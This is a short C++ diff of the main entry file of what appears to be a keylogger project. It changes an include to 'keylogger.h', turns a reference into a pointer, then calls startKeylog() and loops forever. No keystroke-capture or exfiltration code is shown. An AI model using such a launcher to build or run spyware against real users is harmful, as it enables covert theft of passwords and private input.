@@ -1,12 +1,12 @@
 #include <iostream>
 
-#include "keyboard.h"
+#include "keylogger.h"
 
 int main() {
 	Keyboard keyboard{};
-	Keylogger& keylogger = *keyboard.keylogger;
+	Keylogger* keylogger = keyboard.keylogger;
 
-	keylogger.startKeylog();
+	keylogger->startKeylog();
 	while (true) {
 		;
 	}
